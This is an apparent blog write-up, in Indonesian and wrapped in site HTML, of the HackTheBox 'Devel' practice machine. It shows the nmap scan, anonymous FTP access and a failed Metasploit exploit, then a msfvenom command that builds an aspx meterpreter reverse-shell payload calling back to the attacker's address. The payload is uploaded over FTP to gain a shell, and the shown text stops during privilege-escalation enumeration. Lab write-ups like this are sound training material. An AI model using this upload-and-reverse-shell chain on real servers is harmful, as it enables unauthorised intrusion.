@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            [Writeup][HackTheBox] Devel  &ndash;
+        
+        Justakazh
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://justakazh.github.io/css/styles.26d59987c529c11f19dac0cd80af6b1379e56b7b612cae93654fdd40a27f308dc8961937dba7b34e8451321ffc6d66bfcf1fdd9d2602acb2bdee877e78ba4345.css integrity="sha512-JtWZh8UpwR8Z2sDNgK9rE3nla3thLK6TZU/dQKJ/MI3Ilhk326ezToRRMh/8bWa/zx/dnSYCrLK97od&#43;eLpDRQ==" />
+<meta name="author" content="Justakazh" />
+
+    
+        <meta name="keywords" content='easy, ftp, hackhebox, hacking, privesc, windows, writeup, 21' />
+    
+    
+        <meta name="description" content=" : Devel
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP Enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel] └─$ sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports [sudo] password for punktester: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:30 HST Nmap scan report for 10.129.136.185 Host is up (0.20s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft IIS httpd 7." />
+    
+
+<meta property="og:site_name"
+    content='Justakazh' />
+
+    <meta property="og:title" content="[Writeup][HackTheBox] Devel" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Justakazh" />
+    <meta
+        property="article:published_time"
+        content='2022-09-29T06:49:09Z-1000' />
+    
+        
+            <meta property="article:tag" content="easy" />
+        
+            <meta property="article:tag" content="ftp" />
+        
+            <meta property="article:tag" content="hackhebox" />
+        
+            <meta property="article:tag" content="hacking" />
+        
+            <meta property="article:tag" content="privesc" />
+        
+            <meta property="article:tag" content="windows" />
+        
+            <meta property="article:tag" content="writeup" />
+        
+            <meta property="article:tag" content="21" />
+        
+    
+    <meta property="og:url" content="https://justakazh.github.io/posts/writeuphackthebox-devel/" />
+    <meta property="og:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="Summary Machine Name : Devel
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP Enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/d" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='justakazh.github.io'
+/>
+<meta property="twitter:url" content="https://justakazh.github.io/posts/writeuphackthebox-devel/" />
+
+
+    <meta name="twitter:title" content="[Writeup][HackTheBox] Devel" />
+    
+    <meta name="twitter:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="Summary Machine Name : Devel
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP Enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/d" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<pre>                                            
+      _           _        _             _     
+     | |_   _ ___| |_ __ _| | ____ _ ___| |__  
+  _  | | | | / __| __/ _` | |/ / _` |_  / '_ \ 
+ | |_| | |_| \__ \ || (_| |   &lt; (_| |/ /| | | |
+  \___/ \__,_|___/\__\__,_|_|\_\__,_/___|_| |_|
+                                                                                            </pre><div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                   
+                </a>
+            
+
+            <div class="rightOfLogo">
+                <div id="wide_nav">
+<nav>
+
+    
+<br>
+<br />
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+	<li><a href="/tags">Tags</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/donate/">Donate</a></li>
+        
+            <li><a href="">HackStreet</a></li>
+        
+        
+            
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://facebook.com/hs1337">
+    
+    
+        &#xf09a;
+    
+    <span>
+        facebook
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/justakazh">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/akazh18">
+    
+    
+        &#xf099;
+    
+    <span>
+        Twitter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>[Writeup][HackTheBox] Devel</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2022-09-29
+
+</p>
+    
+    
+    
+    
+    <div><h2 id="summary">Summary</h2>
+<p>Machine Name : Devel</p>
+<p>Machine Difficult : Easy</p>
+<p>Machine Author : <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<p>Machine URL : <a href="https://app.hackthebox.com/machines/Devel">Hack The Box</a></p>
+<h2 id="nmap-enumeration">NMAP Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/htb/easy/devel<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> punktester: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-14 06:30 HST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.136.185
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     Microsoft ftpd
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 32.25 seconds
+</span></span><span style="display:flex;"><span>zsh: segmentation fault  sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports
+</span></span></code></pre></div><h2 id="21---ftp">21 - FTP</h2>
+<p>dapat dilihat dari hasil scanning nmap, target tersebut memiliki port 21/ftp microsoft ftpd. langkah awal yang akan saya lakukan adalah melakukan pengecheckan terhadap anonymous login</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/htb/easy/devel<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.129.136.185   
+</span></span><span style="display:flex;"><span>Connected to 10.129.136.185.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.136.185:punktester<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49157|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+</span></span><span style="display:flex;"><span>03-17-17  05:37PM                  <span style="color:#ae81ff">689</span> iisstart.htm
+</span></span><span style="display:flex;"><span>03-17-17  05:37PM               <span style="color:#ae81ff">184946</span> welcome.png
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>disini saya berhasil untuk login pada ftp dengan akun anonymous. selanjutnya saya mencoba untuk mencari exploit dari microsoft ftpd pada metasploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search Microsoft ftpd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                          Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                          ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/windows/ftp/ms09_053_ftpd_nlst        2009-08-31       great   No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof  2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 1, use <span style="color:#ae81ff">1</span> or use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
+</span></span></code></pre></div><p>terdapat 1 module exploit yaitu <strong>exploit/windows/ftp/ms09_053_ftpd_nlst</strong>  module ini menyerang stack buffer overflow pada microsoft iis ftp service</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/ftp/ms09_053_ftpd_nlst<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/ftp/ms09_053_ftpd_nlst<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting      Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------      --------  -----------
+</span></span><span style="display:flex;"><span>   FTPPASS  mozilla@example.com  no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   FTPUSER  anonymous            no        The username to authenticate as
+</span></span><span style="display:flex;"><span>   RHOSTS   10.129.136.185       yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span style="display:flex;"><span>   RPORT    <span style="color:#ae81ff">21</span>                   yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.15      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Windows <span style="color:#ae81ff">2000</span> SP4 English/Italian <span style="color:#f92672">(</span>IIS 5.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/ftp/ms09_053_ftpd_nlst<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.15:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - <span style="color:#ae81ff">257</span> <span style="color:#e6db74">&#34;LSRSWHVOZI&#34;</span> directory created.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - <span style="color:#ae81ff">250</span> CWD command successful.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - Creating long directory...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - <span style="color:#ae81ff">451</span> No mapping <span style="color:#66d9ef">for</span> the Unicode character exists in the target multi-byte code page.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - <span style="color:#ae81ff">200</span> PORT command successful.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - Trying target Windows <span style="color:#ae81ff">2000</span> SP4 English/Italian <span style="color:#f92672">(</span>IIS 5.0<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185:21 - <span style="color:#ae81ff">451</span> No mapping <span style="color:#66d9ef">for</span> the Unicode character exists in the target multi-byte code page.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/ftp/ms09_053_ftpd_nlst<span style="color:#f92672">)</span> &gt; 
+</span></span></code></pre></div><p>sayangnya disini saya tidak berhasil mendapatkan akses tersebut, akan tetapi jika diperhatikan pada gambar dibawah ini beberapa payload dari module tersebut berhasil terupload pada server tersebut, ini menunjukan bahwa directory tersebut writable.</p>
+<p><img src="/home/punktester/.config/marktext/images/2022-10-14-07-03-58-image.png" alt=""></p>
+<p>disini saya berfikir untuk mengupload aspx backdoor menggunakan ftp, langkah pertama saya membuat sebuah payload dengan <strong>msfvenom</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/htb/easy/devel<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.15 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f aspx &gt; halah.aspx 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">354</span> bytes
+</span></span><span style="display:flex;"><span>Final size of aspx file: <span style="color:#ae81ff">2866</span> bytes
+</span></span></code></pre></div><p>selanjutnya saya menjalankan module listener pada metasploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.15      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.15:4444 
+</span></span></code></pre></div><p>selanjutnya saya mengupload file aspx yang telah dibuat tadi menggunakan ftp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put halah.aspx 
+</span></span><span style="display:flex;"><span>local: halah.aspx remote: halah.aspx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49171|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening ASCII mode data connection.
+</span></span><span style="display:flex;"><span>100% |*********************| <span style="color:#ae81ff">2903</span> 28.25 MiB/s --:-- ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2903</span> bytes sent in 00:00 <span style="color:#f92672">(</span>14.37 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49172|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>03-18-17 02:06AM &lt;DIR&gt; aspnet_client
+</span></span><span style="display:flex;"><span>10-14-22 03:04AM <span style="color:#ae81ff">2903</span> halah.aspx
+</span></span><span style="display:flex;"><span>03-17-17 05:37PM <span style="color:#ae81ff">689</span> iisstart.htm
+</span></span><span style="display:flex;"><span>10-14-22 02:37AM &lt;DIR&gt; IJXWLJHLQP
+</span></span><span style="display:flex;"><span>10-14-22 03:03AM &lt;DIR&gt; LSRSWHVOZI
+</span></span><span style="display:flex;"><span>10-14-22 02:42AM &lt;DIR&gt; NGPQBPUQBP
+</span></span><span style="display:flex;"><span>10-14-22 02:41AM &lt;DIR&gt; QXWHDTRVPU
+</span></span><span style="display:flex;"><span>10-14-22 03:02AM &lt;DIR&gt; RYPCOZGWIS
+</span></span><span style="display:flex;"><span>10-14-22 02:44AM &lt;DIR&gt; SLKGVHRIWP
+</span></span><span style="display:flex;"><span>10-14-22 02:41AM &lt;DIR&gt; TNWEJUVKYW
+</span></span><span style="display:flex;"><span>10-14-22 02:52AM &lt;DIR&gt; VXCBCGBZWI
+</span></span><span style="display:flex;"><span>03-17-17 05:37PM <span style="color:#ae81ff">184946</span> welcome.png
+</span></span></code></pre></div><p>file tersebut berhasil terupload sesuai expetasi, selanjutnya saya akan mengakses file tersebut melalui browser untuk mentrigger paylaod</p>
+<p><img src="/home/punktester/.config/marktext/images/2022-10-14-07-06-47-image.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.129.136.185
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.15:4444 -&gt; 10.129.136.185:49173 <span style="color:#f92672">)</span> at 2022-10-14 07:06:31 -1000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: IIS APPPOOL<span style="color:#ae81ff">\W</span>eb
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><p>Saya berhasil mendapatkan akses server tersebut, namun disini saya harus melakukan privilege escalation untuk mendapatkan akses sepenuhnya dari target. disini saya menggunakan module post <strong>multi/recon/local_exploit_suggester</strong> yang dimana modul ini melakukan pengecheckan terhadap potensi kerentanan lokal</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information              Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------              ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         meterpreter x86/windows  IIS APPPOOL<span style="color:#ae81ff">\W</span>eb @ DEVEL  10.10.14.15:4444 -&gt; 10.129.136.185:49173  <span style="color:#f92672">(</span>10.129.136.185<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>post/multi/recon/local_exploit_suggester<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name             Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----             ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   SESSION          <span style="color:#ae81ff">1</span>                yes       The session to run this module on
+</span></span><span style="display:flex;"><span>   SHOWDESCRIPTION  false            yes       Displays a detailed description <span style="color:#66d9ef">for</span> the available exploits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/windows...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.136.185 - <span style="color:#ae81ff">40</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.136.185 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
